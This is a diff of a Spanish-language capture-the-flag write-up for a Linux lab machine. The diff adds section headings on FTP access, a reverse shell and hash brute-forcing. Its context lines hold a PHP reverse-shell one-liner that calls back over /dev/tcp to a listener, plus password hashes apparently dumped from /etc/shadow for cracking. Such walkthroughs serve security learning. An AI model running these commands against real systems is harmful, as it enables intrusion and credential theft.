@@ -14,6 +14,7 @@ categories:
 tags:  
   - Medium
   - Linux
+  - FTP
   - Brute force
   - SUID
   - Sudo abuse
@@ -98,6 +99,9 @@ De alguna forma parece que nos está indicando varias pistas. Si miramos el recu
 
 "The extra-secured .jpg file contains my password but nobody can obtain it."
 
+
+### FTP
+
 Veamos el acceso FTP ahora:
 
 ~~~bash
@@ -127,6 +131,9 @@ ftp> ls
 ~~~
 
 Aparentemente tenemos acceso al directorio donde está la web, por lo que podríamos tratar de subir una reverse shell, aunque aparentemente estará protegida para que no interprete php.
+
+
+### Reverse shell
 
 Creo una reverse shell en diferentes formatos como php* con la forma típica: `<?php system("bash -c 'bash -i >& /dev/tcp/192.168.1.150/1234 0>&1'"); ?>`
 
@@ -246,6 +253,9 @@ sshd:*:18544:0:99999:7:::
 markos:$6$PTerrFpyfOmkM5Xi$oo8gNZyyxsZbKhOIXrm2w/x.Xvhdr7Ny/4JgLDRLRAxAwEwGtH2kD7PjzeloAstqCPq/KKrqrPioMM8vwWbqZ.:18544:0:99999:7:::
 peter:$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81:18544:0:99999:7:::
 ~~~
+
+
+### Fuerza bruta a hash
 
 De esta forma, me guardo este contenido en un fichero llamado hash en mi máquina y vamos a tratar de usar fuerza bruta:
 
